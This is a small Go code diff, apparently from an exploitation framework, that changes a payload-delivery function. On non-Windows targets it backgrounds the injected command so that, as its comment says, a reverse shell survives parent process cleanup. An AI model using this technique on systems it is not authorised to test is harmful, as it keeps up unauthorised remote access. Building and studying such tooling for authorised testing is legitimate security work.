@@ -146,6 +146,12 @@ func (d *delivery) directPayload() error {
 		return fmt.Errorf("payload generation failed: %w", err)
 	}
 
+	// Background the payload so injection contexts return immediately
+	// and the reverse shell survives parent process cleanup.
+	if d.platform != "windows" {
+		payloadCmd = fmt.Sprintf("(%s &)", payloadCmd)
+	}
+
 	run := BuildContext(d.params, payloadCmd)
 	run.SetTarget(d.modTarget)
 	return d.exploit(run)
